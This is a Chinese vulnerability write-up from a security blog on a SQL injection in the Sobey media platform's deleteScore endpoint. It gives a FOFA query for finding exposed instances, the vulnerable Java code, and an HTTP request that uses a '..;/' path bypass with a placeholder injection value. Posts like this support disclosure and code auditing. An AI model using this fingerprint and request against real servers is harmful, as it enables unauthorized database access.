---
title: "索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/deleteScore SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-jztEditorScore-deleteScore-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchjzteditorscoredeletescore-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/deleteScore SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/17 08:11
* 541浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

授权

软件

Web安全课程


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/jztEditorScore/deleteScore 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入防护

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/jztEditorScore/deleteScore`的实现逻辑

```
@RequestMapping(
    value = {"/deleteScore"},
    method = {RequestMethod.POST}
)
public Response deleteScore(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("ids") String ids) {
    if (StringUtils.isNotEmpty(ids)) {
        String[] idArray = ids.split(",");
        StringBuffer deleteBuffer = new StringBuffer("delete from  zcncommoneditorscore where 1= 1 ");
        SchemaSQLUtil.appendInCondition(deleteBuffer, "id", Arrays.asList(idArray));
        (new QueryBuilder(deleteBuffer.toString())).executeNoQuery();
    }

    return Response.successMsg(this.enTips("delete.success", "删除成功。"));
}
```

深入探索

Windows安全工具

SQL注入检测工具

编程语言教程

参数ids使用逗号分割成数组后带入appendInCondition跟进

代码安全审计

```
public static <T> void appendInCondition(StringBuffer sqlbuffer, String colomnName, Collection<T> values) {
    appendInCondition(sqlbuffer, colomnName, values, false);
}

public static <T> void appendInCondition(StringBuffer sqlbuffer, String colomnName, Collection<T> values, boolean or) {
    if (!or) {
        sqlbuffer.append(String.format(" and %s in (", colomnName));
    } else {
        sqlbuffer.append(String.format(" or %s in (", colomnName));
    }

    int num = values.size();

    for(T value : values) {
        sqlbuffer.append(String.format(" '%s' ", value.toString()));
        --num;
        if (num > 0) {
            sqlbuffer.append(",");
        }
    }

    sqlbuffer.append(") ");
}
```

深入探索

文件大小转换

计算机安全

网络安全培训

代码一看就很明了了，**ids**是无任何过滤或校验处理，被直接拼接在in子语句中，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /sobey-mchEditor/js/..;/mch/jztEditorScore/deleteScore HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

channelId=1&ids='SQLI_POC&isRenYuan=1&siteCode=&token=&userCode=admin
```

[![索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/deleteScore SQL注入漏洞](images/img-001-953a3625a4fc.webp)](https://image.mrxn.net/c8e1690a44a64bc5baf04b7ae1511198.webp)

成功延时 5 秒

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/jztEditorScore/deleteScore SQL注入漏洞](https://mrxn.net/jswz/sobey-jztEditorScore-deleteScore-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-jztEditorScore-deleteScore-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-jztEditorScore-deleteScore-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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